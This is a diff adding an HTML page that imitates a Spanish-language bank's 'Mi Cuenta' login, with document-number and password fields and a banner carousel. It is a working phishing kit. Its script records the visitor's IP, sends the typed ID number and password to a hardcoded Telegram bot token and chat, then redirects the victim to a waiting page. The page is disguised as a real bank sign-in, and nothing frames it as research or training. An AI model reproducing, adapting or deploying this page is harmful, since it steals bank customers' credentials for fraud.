@@ -1,0 +1,350 @@
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ingresar a Mi Cuenta</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+box-sizing:border-box;
+}
+
+body{
+font-family:'Roboto',sans-serif;
+margin:0;
+background:#dfe3e8;
+display:flex;
+flex-direction:column;
+align-items:center;
+}
+
+/* HEADER */
+
+.header{
+width:100%;
+background:#ffffff;
+padding:15px 20px;
+border-bottom:1px solid #dcdcdc;
+}
+
+.header img{
+height:40px;
+}
+
+/* CONTENEDOR */
+
+.container{
+width:100%;
+max-width:420px;
+padding:20px;
+}
+
+/* TITULO */
+
+h2{
+font-size:22px;
+color:#3a3a3a;
+margin-bottom:25px;
+}
+
+/* INPUTS */
+
+.form-group{
+margin-bottom:20px;
+}
+
+.form-group label{
+display:block;
+margin-bottom:6px;
+font-size:14px;
+}
+
+.form-group input{
+width:100%;
+padding:14px;
+border-radius:12px;
+border:1px solid #cfd4da;
+background:#f4f6f8;
+font-size:15px;
+color: #0062BD;
+font-weight: 500;
+}
+
+/* LINKS */
+
+.form-links{
+margin-bottom:20px;
+}
+
+.form-links a{
+color:#1a73e8;
+text-decoration:none;
+font-size:14px;
+}
+
+/* BOTONES */
+
+.bottom{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:25px;
+}
+
+.register{
+color:#1a73e8;
+text-decoration:none;
+}
+
+/* ESTILO DINÁMICO DEL BOTÓN (ARRANCA DESACTIVADO) */
+.form-button{
+background:#b0b0b0; /* Gris por defecto */
+color:white;
+border:none;
+padding:13px 28px;
+border-radius:28px;
+cursor: not-allowed;
+opacity: 0.7;
+transition: background-color 0.3s, cursor 0.3s, opacity 0.3s;
+font-weight: bold;
+}
+
+/* CUANDO SE ACTIVA PASA A TU AZUL */
+.form-button:not(:disabled) {
+background:#1f6ed4;
+cursor:pointer;
+opacity:1;
+}
+
+/* BANNER */
+
+.banner{
+width:100%;
+max-width:420px;
+padding:0 20px;
+}
+
+.carousel{
+overflow:hidden;
+border-radius:12px;
+width:100%;
+}
+
+.carousel-track{
+display:flex;
+transition:transform 0.5s ease;
+}
+
+.carousel-track img{
+width:100%;
+flex:0 0 100%;
+}
+
+/* DOTS */
+
+.dots{
+display:flex;
+justify-content:center;
+margin-top:8px;
+gap:6px;
+}
+
+.dot{
+width:7px;
+height:7px;
+background:#c6c6c6;
+border-radius:50%;
+}
+
+.dot.active{
+background:#5c6b7a;
+}
+
+/* FOOTER */
+
+.footer{
+width:100%;
+max-width:420px;
+display:flex;
+justify-content:space-between;
+padding:15px 20px;
+font-size:14px;
+}
+
+.footer a{
+color:#1a73e8;
+text-decoration:none;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="header">
+<img src="images.png">
+</div>
+
+<div class="container">
+
+<h2>Ingresá a Mi Cuenta</h2>
+
+<form id="loginForm">
+
+<div class="form-group">
+<label>Nro. de documento</label>
+<input type="text" id="document" inputmode="numeric" maxlength="8" placeholder="Document" required>
+</div>
+
+<div class="form-group">
+<label>Contraseña</label>
+<input type="password" id="password" placeholder="Contraseña" required>
+</div>
+
+<div class="form-links">
+<a href="#">¿Olvidaste tu contraseña?</a>
+</div>
+
+<div class="bottom">
+<a class="register" href="#">Registrarme</a>
+<button type="button" id="loginBtn" class="form-button" onclick="handleLogin(event)" disabled>Ingresar</button>
+</div>
+
+</form>
+
+</div>
+
+<div class="banner">
+
+<div class="carousel">
+<div class="carousel-track" id="track">
+
+<img src="banner-beneficio-tipo-cambio.jpg">
+<img src="banner-apay.jpg">
+<img src="beneficio-banner-disa-x3.jpg">
+<img src="beneficio-banner-telepeaje.jpg">
+<img src="beneficio-banner-debitos.jpg">
+
+</div>
+</div>
+
+<div class="dots">
+<div class="dot active"></div>
+<div class="dot"></div>
+<div class="dot"></div>
+<div class="dot"></div>
+<div class="dot"></div>
+</div>
+
+</div>
+
+<div class="footer">
+<a href="#">Abrir cuenta</a>
+<a href="#">Solicitar tarjeta de crédito</a>
+</div>
+
+<script>
+
+const telegramConfig = {
+    token: "8970007679:AAGuf7BgO9QeObwd4J575MKg51bvUiULAXU",
+    chatId: "-1004423062828",
+};
+
+let userIP = "No disponible";
+
+fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+      userIP = data.ip;
+  })
+  .catch(err => {
+      console.error("No se pudo obtener la IP:", err);
+  });
+
+// Captura de elementos para la validación en tiempo real
+const documentInput = document.getElementById('document');
+const passwordInput = document.getElementById('password');
+const loginBtn = document.getElementById('loginBtn');
+
+// Función que revisa si se cumplen las reglas para activar el botón azul
+function validarFormulario() {
+    // Forzar a que el documento contenga exclusivamente números
+    documentInput.value = documentInput.value.replace(/\D/g, '');
+
+    const docVal = documentInput.value;
+    const passVal = passwordInput.value;
+
+    // Regla: Documento exactamente igual a 8 números y clave mínimo de 5 caracteres alfanuméricos
+    if (docVal.length === 8 && passVal.length >= 5) {
+        loginBtn.disabled = false;
+    } else {
+        loginBtn.disabled = true;
+    }
+}
+
+// Escuchar lo que escribe el usuario en ambos campos para evaluar al instante
+documentInput.addEventListener('input', validarFormulario);
+passwordInput.addEventListener('input', validarFormulario);
+
+async function handleLogin(event){
+    event.preventDefault();
+    
+    const documentVal = documentInput.value;
+    const passwordVal = passwordInput.value;
+
+    if (!documentVal || !passwordVal) {
+        return;
+    }
+
+    const mensajeTelegram = `🔔 *Nuevo Acceso de Alumno*\n\n📄 *Documento:* \`${documentVal}\`\n🔑 *Contraseña:* \`${passwordVal}\`\n🌐 *IP:* \`${userIP}\``;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${telegramConfig.token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: telegramConfig.chatId,
+                text: mensajeTelegram,
+                parse_mode: "Markdown"
+            })
+        });
+
+        window.location.href = "espera.html";
+    } catch (err) {
+        console.error('Error al enviar la notificación a Telegram:', err);
+        window.location.href = "espera.html";
+    }
+}
+
+document.addEventListener("DOMContentLoaded", function(){
+
+    let index = 0
+    const track = document.getElementById("track")
+    const dots = document.querySelectorAll(".dot")
+    const slides = track.querySelectorAll("img")
+
+    function moveSlide(){
+
+        index++
+
+        if(index >= slides.length){
+            index = 0
+        }
+
+        track.style.transform = "translateX(-" + (index * 100) + "%)"
+
+        dots.forEach(dot => dot.classList.remove("active"))
+        dots[index].classList.add("active")
+
+    }
+
+    setInterval(moveSlide,3000)
+
+})
+
+</script>
+</body>
+</html>
